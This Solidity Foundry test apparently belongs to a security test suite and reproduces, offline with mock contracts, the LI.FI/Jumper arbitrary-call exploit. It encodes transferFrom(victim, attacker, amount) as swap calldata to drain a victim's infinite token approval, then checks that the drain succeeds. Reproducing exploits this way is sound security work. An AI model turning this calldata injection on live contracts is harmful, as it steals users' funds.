// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {LiFiGasZipClone} from "../fixtures/malicious-calldata/b-incident/LiFiGasZipClone.sol";

/// @title malicious-calldata tier (b): LI.FI / Jumper arbitrary-call exploit (2024-07-16, ~$9.73M).
/// @notice Minimized offline reproduction of the documented mechanism: a swap facet executed a
///         caller-supplied call target + calldata without validation. The attacker encoded
///         transferFrom(victim, attacker, amount) against a token the victim had granted the
///         diamond an INFINITE approval for; the call ran with msg.sender == the diamond and
///         drained the victim. Verdict derived from the real outcome. See PROVENANCE.md.
contract LiFiIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 300_000e18; // representative, scaled
    address constant VICTIM = address(0x11F1);
    address constant ATTACKER = address(0xBAD77);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_lifi_arbitrarySwapCall_drainsInfiniteApproval() public {
        MockERC20 token = new MockERC20();
        LiFiGasZipClone diamond = new LiFiGasZipClone();

        // A user holds funds and grants the LI.FI diamond an INFINITE approval (the exploited
        // case; finite approvals were unaffected in the real incident).
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(diamond), type(uint256).max);

        // ATTACK: the attacker crafts a "swap" whose real effect is transferFrom(victim ->
        // attacker) and submits it to the unvalidated swap route.
        bytes memory injected =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VICTIM, ATTACKER, VICTIM_BALANCE);
        LiFiGasZipClone.SwapData memory swap = LiFiGasZipClone.SwapData({
            callTo: address(token),
            fromToken: address(token),
            callData: injected
        });
        vm.prank(ATTACKER);
        diamond.depositToGasZipERC20(swap);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("lifi-gaszip-victim", drained);

        assertTrue(drained, "unvalidated swap call should drain the infinite approval");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim's approval");
    }
}
